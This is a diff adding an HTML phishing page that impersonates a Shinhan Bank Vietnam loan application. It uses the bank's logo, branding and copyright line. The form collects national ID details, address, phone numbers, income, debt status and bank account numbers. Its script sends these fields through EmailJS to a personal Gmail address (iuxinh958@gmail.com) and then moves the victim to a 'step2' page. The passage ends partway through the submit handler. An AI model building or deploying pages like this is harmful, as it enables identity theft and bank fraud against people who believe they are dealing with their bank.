@@ -1,0 +1,982 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Đăng Ký Vay Tín Chấp - Shinhan Bank</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            font-size: 16px;
+            margin: 0;
+            background-color: #f8f9fa;
+        }
+        .header {
+            padding: 15px;
+            background-color: #ffffff;
+            border-bottom: 1px solid #b3cde0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .header img {
+            height: 35px;
+        }
+        .header-icons {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        .header-icons i {
+            font-size: 24px;
+            cursor: pointer;
+            color: #0052cc;
+        }
+        .container {
+            max-width: 90%;
+            width: 100%;
+            margin: 15px 5%;
+            padding: 15px;
+            background: #ffffff;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0, 82, 204, 0.1);
+        }
+        @media (min-width: 768px) {
+            .container {
+                max-width: 700px;
+                margin: 15px auto;
+            }
+        }
+        .nav-tabs {
+            display: flex;
+            justify-content: space-around;
+            margin-bottom: 15px;
+            margin-top: 10px;
+            flex-wrap: nowrap;
+        }
+        .nav-tabs .nav-item {
+            flex: 1;
+            text-align: center;
+        }
+        .nav-tabs .nav-link {
+            background-color: #d3d3d3;
+            color: #ffffff;
+            border-radius: 20px;
+            padding: 8px 10px;
+            font-weight: 500;
+            font-size: 12px;
+            width: 100%;
+            margin: 0 2px;
+            white-space: nowrap;
+        }
+        .nav-tabs .nav-link.active {
+            background-color: #0033a0;
+            color: #ffffff;
+        }
+        @media (max-width: 767px) {
+            .nav-tabs .nav-link {
+                font-size: 10px;
+                padding: 6px 8px;
+            }
+        }
+        .section-title {
+            color: #0033a0;
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+            text-align: center;
+        }
+        .form-label {
+            font-weight: 400;
+            color: #1a3c87;
+            font-size: 14px;
+            margin-bottom: 3px;
+        }
+        .form-label span {
+            color: #ff4d4f;
+        }
+        .form-control, .form-select {
+            border-radius: 20px;
+            border: 1px solid #b3cde0;
+            padding: 8px 12px;
+            font-size: 14px;
+            height: 40px;
+            font-family: 'Roboto', sans-serif;
+            transition: border-color 0.3s ease;
+        }
+        .form-control:focus, .form-select:focus {
+            border-color: #0033a0;
+            box-shadow: 0 0 5px rgba(0, 51, 160, 0.3);
+            outline: none;
+        }
+        .form-control.valid, .form-select.valid {
+            border-color: #0033a0 !important;
+        }
+        .form-control.ultra-short {
+            width: 60px;
+        }
+        .form-control.extra-short {
+            width: 120px;
+        }
+        .form-control.short {
+            width: 250px;
+        }
+        .form-control.medium {
+            width: 350px;
+        }
+        .form-control.long {
+            width: 500px;
+        }
+        @media (max-width: 767px) {
+            .form-control.ultra-short {
+                width: 20vw;
+            }
+            .form-control.extra-short {
+                width: 40vw;
+            }
+            .form-control.short {
+                width: 50vw;
+            }
+            .form-control.medium {
+                width: 70vw;
+            }
+            .form-control.long {
+                width: 85vw;
+            }
+        }
+        .form-control:disabled {
+            background-color: #e0e7ff;
+        }
+        .form-select {
+            appearance: none;
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-chevron-down" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z"/></svg>');
+            background-repeat: no-repeat;
+            background-position: right 10px center;
+            background-size: 12px;
+            height: 40px;
+        }
+        .form-select.ultra-short {
+            width: 60px;
+        }
+        .form-select.extra-short {
+            width: 120px;
+        }
+        .form-select.short {
+            width: 250px;
+        }
+        .form-select.medium {
+            width: 350px;
+        }
+        .form-select.long {
+            width: 500px;
+        }
+        @media (max-width: 767px) {
+            .form-select.ultra-short {
+                width: 20vw;
+            }
+            .form-select.extra-short {
+                width: 40vw;
+            }
+            .form-select.short {
+                width: 50vw;
+            }
+            .form-select.medium {
+                width: 70vw;
+            }
+            .form-select.long {
+                width: 85vw;
+            }
+        }
+        .form-note {
+            color: #0052cc;
+            font-size: 12px;
+            margin-top: 3px;
+        }
+        .btn-primary, .btn-secondary {
+            background-color: #0033a0;
+            border: none;
+            border-radius: 20px;
+            padding: 8px 16px;
+            font-weight: 700;
+            font-size: 14px;
+            font-family: 'Roboto', sans-serif;
+            transition: background-color 0.3s ease;
+        }
+        .btn-primary:hover, .btn-secondary:hover {
+            background-color: #0052cc;
+        }
+        .footer {
+            background-color: #0033a0;
+            color: #ffffff;
+            text-align: center;
+            padding: 15px;
+            font-size: 12px;
+        }
+        .footer-links a {
+            color: #b3cde0;
+            margin: 0 8px;
+            text-decoration: none;
+        }
+        .footer-links a:hover {
+            color: #ffffff;
+        }
+        .error-message {
+            color: #ff4d4f;
+            font-size: 14px;
+            font-weight: 500;
+            text-align: center;
+            margin-top: 5px;
+            padding: 6px;
+            background-color: #ffe6e6;
+            border-radius: 5px;
+            display: none;
+        }
+        .invalid-feedback {
+            display: none;
+            font-size: 12px;
+            color: #ff4d4f;
+        }
+        .was-validated .form-control:invalid, .was-validated .form-select:invalid {
+            border-color: #ff4d4f;
+        }
+        .was-validated .form-control:invalid ~ .invalid-feedback,
+        .was-validated .form-select:invalid ~ .invalid-feedback {
+            display: block;
+        }
+        .form-group {
+            position: relative;
+            margin-bottom: 5px;
+            padding-bottom: 5px;
+        }
+        .form-group-bordered {
+            border-bottom: 1px solid #d3d3d3;
+        }
+        .form-group:last-child {
+            border-bottom: none;
+        }
+        .section-divider {
+            border-top: 1px solid #d3d3d3;
+            margin: 15px 0;
+        }
+        .button-group {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 15px;
+        }
+        @media (max-width: 767px) {
+            .button-group {
+                flex-direction: row;
+                justify-content: center;
+            }
+            .button-group a, .button-group button {
+                flex: 1;
+                text-align: center;
+            }
+        }
+        .dropdown-menu {
+            min-width: 200px;
+        }
+        .dropdown-menu a {
+            color: #0033a0;
+            text-transform: uppercase;
+            font-size: 14px;
+            padding: 8px 12px;
+        }
+        .dropdown-menu a:hover {
+            background-color: #e6f0fa;
+            color: #0052cc;
+        }
+        .row-group {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
+        .row-group .form-group {
+            flex: 1;
+            border-bottom: 1px solid #d3d3d3;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo">
+        <div class="header-icons">
+            <i class="bi bi-search"></i>
+            <div class="dropdown">
+                <i class="bi bi-list" data-bs-toggle="dropdown" aria-expanded="false"></i>
+                <ul class="dropdown-menu dropdown-menu-end">
+                    <li><a class="dropdown-item" href="#">GIỚI THIỆU</a></li>
+                    <li><a class="dropdown-item" href="#">LỢI ÍCH</a></li>
+                    <li><a class="dropdown-item" href="#">GIẤY TỜ CẦN THIẾT</a></li>
+                    <li><a class="dropdown-item" href="#">ĐĂNG KÝ TRỰC TUYẾN</a></li>
+                    <li><a class="dropdown-item" href="#">XEM KẾT QUẢ</a></li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <ul class="nav-tabs">
+            <li class="nav-item">
+                <a class="nav-link active" href="#">1. Nhập thông tin</a>
+            </li>
+            <li class="nav-item">
+                <a class="nav-link" href="#">2. Xác thực và xử lý</a>
+            </li>
+            <li class="nav-item">
+                <a class="nav-link" href="#">3. Hoàn thành</a>
+            </li>
+        </ul>
+
+        <form id="registerForm" novalidate>
+            <div id="emailError" class="error-message"></div>
+            <div id="storageError" class="error-message"></div>
+
+            <div class="mb-2">
+                <label class="section-title">THÔNG TIN CÁ NHÂN</label>
+                <div class="form-group">
+                    <label class="form-label">Họ và Tên <span>*</span></label>
+                    <input type="text" class="form-control long" id="fullName">
+                    <div class="invalid-feedback"></div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Ngày sinh <span>*</span></label>
+                    <input type="text" class="form-control ultra-short" id="dob" placeholder="DD/MM/YYYY">
+                    <div class="invalid-feedback"></div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Giới tính <span>*</span></label>
+                    <select class="form-select ultra-short" id="gender">
+                        <option value="" disabled selected>Chọn giới tính</option>
+                        <option value="Nam">Nam</option>
+                        <option value="Nữ">Nữ</option>
+                        <option value="Khác">Khác</option>
+                    </select>
+                    <div class="invalid-feedback"></div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Địa chỉ thường trú <span>*</span></label>
+                    <input type="text" class="form-control long" id="contactAddress">
+                    <div class="invalid-feedback"></div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Quê quán <span>*</span></label>
+                    <input type="text" class="form-control long" id="hometown">
+                    <div class="invalid-feedback"></div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Số định danh cá nhân (CCCD/CMND) <span>*</span></label>
+                    <input type="text" class="form-control short" id="idNumber">
+                    <div class="invalid-feedback"></div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Ngày cấp CMND/CCCD <span>*</span></label>
+                    <input type="text" class="form-control ultra-short" id="idIssueDate">
+                    <div class="invalid-feedback"></div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Quốc tịch <span>*</span></label>
+                    <select class="form-select short" id="nationality">
+                        <option value="" disabled selected>Chọn quốc tịch</option>
+                        <option value="Việt Nam">Việt Nam</option>
+                        <option value="Khác">Khác</option>
+                    </select>
+                    <div class="invalid-feedback"></div>
+                </div>
+
+                <div class="form-group form-group-bordered">
+                    <label class="form-label">Nơi cấp <span>*</span></label>
+                    <select class="form-select long" id="idIssuePlace">
+                        <option value="" disabled selected>Chọn nơi cấp</option>
+                        <option value="CỤC TRƯỜNG CỤC CẢNH SÁT QUẢN LÝ HÀNH CHÍNH VỀ TTXH">CỤC TRƯỜNG CỤC CẢNH SÁT QUẢN LÝ HÀNH CHÍNH VỀ TTXH</option>
+                        <option value="Cục Cảnh sát ĐKQL Cư trú và DLQG về dân cư">Cục Cảnh sát ĐKQL Cư trú và DLQG về dân cư</option>
+                    </select>
+                    <div class="invalid-feedback"></div>
+                </div>
+            </div>
+
+            <hr class="section-divider">
+
+            <div class="mb-2">
+                <label class="section-title">THÔNG TIN ĐĂNG KÝ</label>
+                <div class="form-group">
+                    <label class="form-label">Số điện thoại <span>*</span></label>
+                    <input type="text" class="form-control short" id="phoneNumber">
+                    <div class="invalid-feedback"></div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">E-mail <span>*</span></label>
+                    <input type="text" class="form-control medium" id="email">
+                    <div class="form-note">** Bạn sẽ nhận được nhiều thông tin hướng dẫn quy trình đăng ký thông qua email</div>
+                    <div class="invalid-feedback"></div>
+                </div>
+
+                <div class="row-group">
+                    <div class="form-group">
+                        <label class="form-label">Hình thức vay <span>*</span></label>
+                        <select class="form-select short" id="loanType">
+                            <option value="" disabled selected>Chọn Hình thức vay</option>
+                            <option value="Vay tín chấp">Vay tín chấp</option>
+                            <option value="Vay thế chấp">Vay thế chấp</option>
+                            <option value="Vay thấu chi">Vay thấu chi</option>
+                            <option value="Vay trả góp">Vay trả góp</option>
+                        </select>
+                        <div class="invalid-feedback"></div>
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label">Thời hạn vay yêu cầu <span>*</span></label>
+                        <select class="form-select ultra-short" id="loanTerm">
+                            <option value="" disabled selected>Chọn số tháng</option>
+                            <option value="6">6 tháng</option>
+                            <option value="12">12 tháng</option>
+                            <option value="18">18 tháng</option>
+                            <option value="24">24 tháng</option>
+                            <option value="36">36 tháng</option>
+                            <option value="48">48 tháng</option>
+                            <option value="60">60 tháng</option>
+                        </select>
+                        <div class="invalid-feedback"></div>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Số tiền vay yêu cầu (VND) <span>*</span></label>
+                    <select class="form-select short" id="loanAmountInput">
+                        <option value="" disabled selected>Chọn số tiền</option>
+                        <option value="10000000">10,000,000</option>
+                        <option value="20000000">20,000,000</option>
+                        <option value="30000000">30,000,000</option>
+                        <option value="40000000">40,000,000</option>
+                        <option value="50000000">50,000,000</option>
+                        <option value="60000000">60,000,000</option>
+                        <option value="70000000">70,000,000</option>
+                        <option value="80000000">80,000,000</option>
+                        <option value="90000000">90,000,000</option>
+                        <option value="100000000">100,000,000</option>
+                        <option value="150000000">150,000,000</option>
+                        <option value="200000000">200,000,000</option>
+                        <option value="300000000">300,000,000</option>
+                        <option value="400000000">400,000,000</option>
+                        <option value="500000000">500,000,000</option>
+                        <option value="khac">Khác</option>
+                    </select>
+                    <div class="invalid-feedback"></div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Dự kiến giải ngân ngày <span>*</span></label>
+                    <input type="text" class="form-control ultra-short" id="disbursementDate">
+                    <div class="invalid-feedback"></div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Thu nhập hàng tháng (VND) <span>*</span></label>
+                    <input type="text" class="form-control short" id="income">
+                    <div class="invalid-feedback"></div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Nghề nghiệp <span>*</span></label>
+                    <select class="form-select short" id="occupation">
+                        <option value="" disabled selected>Chọn nghề nghiệp</option>
+                        <option value="Kỹ sư">Kỹ sư</option>
+                        <option value="Nhân viên văn phòng">Nhân viên văn phòng</option>
+                        <option value="Giáo viên">Giáo viên</option>
+                        <option value="Bác sĩ">Bác sĩ</option>
+                        <option value="Kinh doanh">Kinh doanh</option>
+                        <option value="Nội trợ">Nội trợ</option>
+                        <option value="Hưu trí">Hưu trí</option>
+                        <option value="Khác">Khác</option>
+                    </select>
+                    <div class="invalid-feedback"></div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Mục đích vay <span>*</span></label>
+                    <select class="form-select short" id="loanPurpose">
+                        <option value="" disabled selected>Chọn mục đích vay</option>
+                        <option value="Mua nhà">Mua nhà</option>
+                        <option value="Mua xe">Mua xe</option>
+                        <option value="Kinh doanh">Kinh doanh</option>
+                        <option value="Học tập">Học tập</option>
+                        <option value="Du lịch">Du lịch</option>
+                        <option value="Tiêu dùng">Tiêu dùng</option>
+                        <option value="Khác">Khác</option>
+                    </select>
+                    <div class="invalid-feedback"></div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Số điện thoại người thân <span>*</span></label>
+                    <input type="text" class="form-control short" id="companyPhone">
+                    <div class="invalid-feedback"></div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Quan hệ <span>*</span></label>
+                    <select class="form-select short" id="companyAddress">
+                        <option value="" disabled selected>Chọn quan hệ</option>
+                        <option value="Bạn bè">Bạn bè</option>
+                        <option value="Anh">Anh</option>
+                        <option value="Chị">Chị</option>
+                        <option value="Em">Em</option>
+                        <option value="Đồng nghiệp">Đồng nghiệp</option>
+                        <option value="Vợ/Chồng">Vợ/Chồng</option>
+                        <option value="Bố">Bố</option>
+                        <option value="Mẹ">Mẹ</option>
+                        <option value="Khác">Khác</option>
+                    </select>
+                    <div class="invalid-feedback"></div>
+                </div>
+
+                <div class="row-group">
+                    <div class="form-group">
+                        <label class="form-label">Có nợ xấu <span>*</span></label>
+                        <select class="form-select ultra-short" id="hasBadDebt">
+                            <option value="" disabled selected>Chọn</option>
+                            <option value="Có">Có</option>
+                            <option value="Không">Không</option>
+                        </select>
+                        <div class="invalid-feedback"></div>
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label">Có nợ chú ý <span>*</span></label>
+                        <select class="form-select ultra-short" id="hasHighDebt">
+                            <option value="" disabled selected>Chọn</option>
+                            <option value="Có">Có</option>
+                            <option value="Không">Không</option>
+                        </select>
+                        <div class="invalid-feedback"></div>
+                    </div>
+                </div>
+            </div>
+
+            <hr class="section-divider">
+
+            <div class="mb-2">
+                <label class="section-title">TÀI KHOẢN GIẢI NGÂN</label>
+                <div class="form-group">
+                    <label class="form-label">Tên chủ tài khoản <span>*</span></label>
+                    <input type="text" class="form-control long" id="accountHolderName">
+                    <div class="invalid-feedback"></div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Số tài khoản <span>*</span></label>
+                    <input type="text" class="form-control short" id="accountNumber">
+                    <div class="invalid-feedback"></div>
+                </div>
+
+                <div class="form-group form-group-bordered">
+                    <label class="form-label">Tên ngân hàng <span>*</span></label>
+                    <select class="form-select short" id="bankName">
+                        <option value="" disabled selected>Chọn ngân hàng</option>
+                        <option value="Shinhan Bank">Shinhan Bank</option>
+                        <option value="Vietcombank">Vietcombank</option>
+                        <option value="Techcombank">Techcombank</option>
+                        <option value="BIDV">BIDV</option>
+                        <option value="Agribank">Agribank</option>
+                        <option value="MB Bank">MB Bank</option>
+                        <option value="VPBank">VPBank</option>
+                        <option value="Sacombank">Sacombank</option>
+                        <option value="ACB">ACB</option>
+                        <option value="VietinBank">VietinBank</option>
+                        <option value="TPBank">TPBank</option>
+                        <option value="HDBank">HDBank</option>
+                        <option value="MSB">MSB</option>
+                        <option value="VIB">VIB</option>
+                        <option value="SeABank">SeABank</option>
+                        <option value="OCB">OCB</option>
+                        <option value="SCB">SCB</option>
+                        <option value="Nam A Bank">Nam A Bank</option>
+                        <option value="SHB">SHB</option>
+                        <option value="PVcomBank">PVcomBank</option>
+                        <option value="BAOVIET Bank">BAOVIET Bank</option>
+                        <option value="LienVietPostBank">LienVietPostBank</option>
+                        <option value="SAIGONBANK">SAIGONBANK</option>
+                    </select>
+                    <div class="invalid-feedback"></div>
+                </div>
+            </div>
+
+            <hr class="section-divider">
+
+            <div class="button-group">
+                <a href="../../index.html" class="btn btn-secondary">QUAY LẠI</a>
+                <button type="submit" class="btn btn-primary">BƯỚC KẾ TIẾP</button>
+            </div>
+        </form>
+    </div>
+
+    <div class="footer">
+        <div class="footer-links">
+            <a href="#">Chính sách bảo mật</a> |
+            <a href="#">Điều khoản sử dụng</a> |
+            <a href="#">Chính sách Cookies</a> |
+            <a href="#">Miễn khoản từ chối liên kết bên ngoài</a> |
+            <a href="#">Hướng dẫn truy cập web</a> |
+            <a href="#">Sitemap</a>
+        </div>
+        <p class="mt-2">Trung tâm bảo mật | Demo Ngân hàng trực tuyến | Liên hệ | Trang Global Portal | Giới Thiệu</p>
+        <p>© 2015 SHINHAN BANK VIETNAM ALL RIGHTS RESERVED.</p>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script>
+        let userData = {};
+
+        function checkLocalStorageQuota() {
+            try {
+                const testKey = '__test__';
+                localStorage.setItem(testKey, 'test');
+                localStorage.removeItem(testKey);
+                return true;
+            } catch (e) {
+                console.error('LocalStorage quota exceeded');
+                return false;
+            }
+        }
+
+        (function() {
+            emailjs.init("OrBsI926QI2_xBh1f");
+        })();
+
+        function saveToLocalStorage() {
+            if (!checkLocalStorageQuota()) {
+                $('#storageError').text('Không đủ dung lượng lưu trữ. Vui lòng kiểm tra thiết bị.').show();
+                return false;
+            }
+            try {
+                const encryptedData = CryptoJS.AES.encrypt(JSON.stringify(userData), 'shinhan-secret-key').toString();
+                localStorage.setItem('userData', encryptedData);
+                console.log('Saved userData to localStorage:', userData);
+                return true;
+            } catch (error) {
+                $('#storageError').text('Lỗi khi lưu dữ liệu. Vui lòng thử lại.').show();
+                console.error('Error saving userData to localStorage:', error);
+                return false;
+            }
+        }
+
+        function loadUserData() {
+            try {
+                const storedData = localStorage.getItem('userData');
+                if (storedData) {
+                    const decryptedData = CryptoJS.AES.decrypt(storedData, 'shinhan-secret-key').toString(CryptoJS.enc.Utf8);
+                    userData = JSON.parse(decryptedData);
+                    console.log('Loaded userData from localStorage:', userData);
+                }
+            } catch (error) {
+                console.error('Error loading userData from localStorage:', error);
+            }
+        }
+
+        function loadRegisteredIds() {
+            try {
+                const storedIds = localStorage.getItem('registeredIds');
+                return storedIds ? JSON.parse(storedIds) : [];
+            } catch (error) {
+                console.error('Error parsing registeredIds from localStorage:', error);
+                return [];
+            }
+        }
+
+        function saveRegisteredIds(ids) {
+            if (!checkLocalStorageQuota()) return;
+            try {
+                localStorage.setItem('registeredIds', JSON.stringify(ids));
+                console.log('Saved registeredIds to localStorage:', ids);
+            } catch (error) {
+                console.error('Error saving registeredIds to localStorage:', error);
+            }
+        }
+
+        function formatNumberInput(value) {
+            if (!value) return "";
+            return value;
+        }
+
+        function formatDateInput(input) {
+            let value = input.val().replace(/[^0-9]/g, '');
+            if (value.length > 8) value = value.slice(0, 8);
+            if (value.length >= 2 && value.length < 4) {
+                value = value.slice(0, 2) + '/' + value.slice(2);
+            } else if (value.length >= 4) {
+                value = value.slice(0, 2) + '/' + value.slice(2, 4) + '/' + value.slice(4);
+            }
+            input.val(value);
+        }
+
+        function getCurrentDate() {
+            const today = new Date();
+            const day = String(today.getDate()).padStart(2, '0');
+            const month = String(today.getMonth() + 1).padStart(2, '0');
+            const year = today.getFullYear();
+            return `${day}/${month}/${year}`;
+        }
+
+        function calculateMonthlyPayment(loanAmount, term) {
+            if (!loanAmount || !term || loanAmount <= 0) return 0;
+            const monthlyRate = 0.075 / 12;
+            const months = parseInt(term) || 0;
+            return Math.round((loanAmount * monthlyRate) / (1 - Math.pow(1 + monthlyRate, -months)));
+        }
+
+        function calculateInterestRate(loanAmount) {
+            if (!loanAmount || loanAmount <= 0) return 0;
+            return loanAmount >= 50000000 ? 7.5 : 8.0;
+        }
+
+        function encryptData(data) {
+            if (!data) return '';
+            return CryptoJS.AES.encrypt(data, 'shinhan-secret-key').toString();
+        }
+
+        function validateForm() {
+            let isValid = true;
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            const phoneRegex = /^[0-9]{10}$/;
+            const idNumberRegex = /^\d{9,12}$/;
+            const dateRegex = /^(0[1-9]|[12]\d|3[01])\/(0[1-9]|1[0-2])\/\d{4}$/;
+            const incomeRegex = /^\d+$/;
+
+            const requiredFields = [
+                { id: 'fullName', selector: '#fullName', label: 'Họ và Tên', regex: null },
+                { id: 'dob', selector: '#dob', label: 'Ngày sinh', regex: dateRegex },
+                { id: 'gender', selector: '#gender', label: 'Giới tính', regex: null },
+                { id: 'contactAddress', selector: '#contactAddress', label: 'Địa chỉ thường trú', regex: null },
+                { id: 'hometown', selector: '#hometown', label: 'Quê quán', regex: null },
+                { id: 'idNumber', selector: '#idNumber', label: 'Số định danh cá nhân', regex: idNumberRegex },
+                { id: 'idIssueDate', selector: '#idIssueDate', label: 'Ngày cấp CMND/CCCD', regex: dateRegex },
+                { id: 'nationality', selector: '#nationality', label: 'Quốc tịch', regex: null },
+                { id: 'idIssuePlace', selector: '#idIssuePlace', label: 'Nơi cấp', regex: null },
+                { id: 'phoneNumber', selector: '#phoneNumber', label: 'Số điện thoại', regex: phoneRegex },
+                { id: 'email', selector: '#email', label: 'E-mail', regex: emailRegex },
+                { id: 'loanType', selector: '#loanType', label: 'Hình thức vay', regex: null },
+                { id: 'loanTerm', selector: '#loanTerm', label: 'Thời hạn vay', regex: null },
+                { id: 'loanAmountInput', selector: '#loanAmountInput', label: 'Số tiền vay', regex: null },
+                { id: 'disbursementDate', selector: '#disbursementDate', label: 'Dự kiến giải ngân ngày', regex: dateRegex },
+                { id: 'income', selector: '#income', label: 'Thu nhập hàng tháng', regex: incomeRegex },
+                { id: 'occupation', selector: '#occupation', label: 'Nghề nghiệp', regex: null },
+                { id: 'loanPurpose', selector: '#loanPurpose', label: 'Mục đích vay', regex: null },
+                { id: 'companyPhone', selector: '#companyPhone', label: 'Số điện thoại người thân', regex: phoneRegex },
+                { id: 'companyAddress', selector: '#companyAddress', label: 'Quan hệ', regex: null },
+                { id: 'hasBadDebt', selector: '#hasBadDebt', label: 'Có nợ xấu', regex: null },
+                { id: 'hasHighDebt', selector: '#hasHighDebt', label: 'Có nợ chú ý', regex: null },
+                { id: 'accountHolderName', selector: '#accountHolderName', label: 'Tên chủ tài khoản', regex: null },
+                { id: 'accountNumber', selector: '#accountNumber', label: 'Số tài khoản', regex: /^\d+$/ },
+                { id: 'bankName', selector: '#bankName', label: 'Tên ngân hàng', regex: null }
+            ];
+
+            $('.form-control, .form-select').removeClass('is-invalid').addClass('valid');
+            $('.invalid-feedback').text('');
+
+            for (const field of requiredFields) {
+                const value = $(field.selector).val();
+                if (!value || value.trim() === "") {
+                    $(field.selector).addClass('is-invalid').removeClass('valid');
+                    $(field.selector).next('.invalid-feedback').text(`Vui lòng nhập ${field.label}`);
+                    isValid = false;
+                    $('html, body').animate({
+                        scrollTop: $(field.selector).offset().top - 50
+                    }, 500);
+                    $(field.selector).focus();
+                    break;
+                }
+                if (field.regex && !field.regex.test(value)) {
+                    $(field.selector).addClass('is-invalid').removeClass('valid');
+                    let errorMessage = `Vui lòng nhập đúng định dạng cho ${field.label}`;
+                    if (field.id === 'email') errorMessage = 'Vui lòng nhập email hợp lệ';
+                    if (field.id === 'phoneNumber' || field.id === 'companyPhone') errorMessage = 'Số điện thoại phải có 10 chữ số';
+                    if (field.id === 'idNumber') errorMessage = 'Số định danh phải có 9-12 chữ số';
+                    if (field.id === 'dob' || field.id === 'idIssueDate' || field.id === 'disbursementDate') errorMessage = 'Ngày phải có định dạng DD/MM/YYYY';
+                    if (field.id === 'income') errorMessage = 'Thu nhập phải là số nguyên';
+                    $(field.selector).next('.invalid-feedback').text(errorMessage);
+                    isValid = false;
+                    $('html, body').animate({
+                        scrollTop: $(field.selector).offset().top - 50
+                    }, 500);
+                    $(field.selector).focus();
+                    break;
+                }
+            }
+
+            return isValid;
+        }
+
+        function sendRegistrationDataEmail() {
+            if (!userData.email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(userData.email)) {
+                $('#emailError').text('Email không hợp lệ. Vui lòng kiểm tra lại.').show();
+                $('html, body').animate({
+                    scrollTop: $('#email').offset().top - 50
+                }, 500);
+                $('#email').focus();
+                return;
+            }
+
+            const params = {
+                full_name: userData.fullName || 'Khách hàng',
+                id_number: encryptData(userData.idNumber || ''),
+                id_issue_date: userData.idIssueDate || '',
+                id_issue_place: userData.idIssuePlace || '',
+                address: userData.contactAddress || '',
+                occupation: userData.occupation || '',
+                income: userData.income || '',
+                phone_number: encryptData(userData.phoneNumber || ''),
+                email: userData.email,
+                loan_amount: userData.loanAmount || '',
+                loan_term: userData.loanTerm || '',
+                loan_purpose: userData.loanPurpose || '',
+                account_number: encryptData(userData.accountNumber || ''),
+                bank_name: userData.bankName || '',
+                loan_code: userData.loanCode || '',
+                registration_date: getCurrentDate(),
+                has_bad_debt: userData.hasBadDebt || '',
+                has_high_debt: userData.hasHighDebt || '',
+                time: new Date().toLocaleString('vi-VN'),
+                name: userData.fullName || 'Shinhan Bank',
+                reply_to: userData.email,
+                to_email: 'iuxinh958@gmail.com'
+            };
+
+            emailjs.send('service_60tgxof', 'template_uhyb8ve', params)
+                .then(() => {
+                    console.log('Email sent successfully');
+                    localStorage.removeItem('pendingEmail');
+                    window.location.href = 'step2.html';
+                })
+                .catch(error => {
+                    $('#emailError').text('Lỗi gửi email. Vui lòng thử lại.').show();
+                    console.error('EmailJS error:', error);
+                    localStorage.setItem('pendingEmail', JSON.stringify(params));
+                });
+        }
+
+        window.onload = function() {
+            loadUserData();
+            $('#fullName').val(userData.fullName || '');
+            $('#dob').val(userData.dob || '');
+            $('#gender').val(userData.gender || '');
+            $('#contactAddress').val(userData.contactAddress || '');
+            $('#hometown').val(userData.hometown || '');
+            $('#idNumber').val(userData.idNumber || '');
+            $('#idIssueDate').val(userData.idIssueDate || '');
+            $('#nationality').val(userData.nationality || '');
+            $('#idIssuePlace').val(userData.idIssuePlace || 'CỤC TRƯỜNG CỤC CẢNH SÁT QUẢN LÝ HÀNH CHÍNH VỀ TTXH');
+            $('#phoneNumber').val(userData.phoneNumber || '');
+            $('#email').val(userData.email || '');
+            $('#loanType').val(userData.loanType || '');
+            $('#loanTerm').val(userData.loanTerm || '');
+            $('#loanAmountInput').val(userData.loanAmount || '');
+            $('#disbursementDate').val(userData.disbursementDate || getCurrentDate());
+            $('#income').val(userData.income || '');
+            $('#occupation').val(userData.occupation || '');
+            $('#loanPurpose').val(userData.loanPurpose || '');
+            $('#companyPhone').val(userData.companyPhone || '');
+            $('#companyAddress').val(userData.companyAddress || '');
+            $('#hasBadDebt').val(userData.hasBadDebt || '');
+            $('#hasHighDebt').val(userData.hasHighDebt || '');
+            $('#accountHolderName').val(userData.accountHolderName || '');
+            $('#accountNumber').val(userData.accountNumber || '');
+            $('#bankName').val(userData.bankName || '');
+        };
+
+        $('#dob, #disbursementDate, #idIssueDate').on('input', function() {
+            formatDateInput($(this));
+        });
+
+        $('#income, #accountNumber').on('input', function() {
+            let value = $(this).val();
+            $(this).val(value);
+        });
+
+        $('#registerForm').on('submit', function(e) {
+            e.preventDefault();
+            const form = e.target;
+            form.classList.add('was-validated');
+            $('#storageError, #emailError').hide();
+
+            if (validateForm()) {
+                const income = $('#income').val();
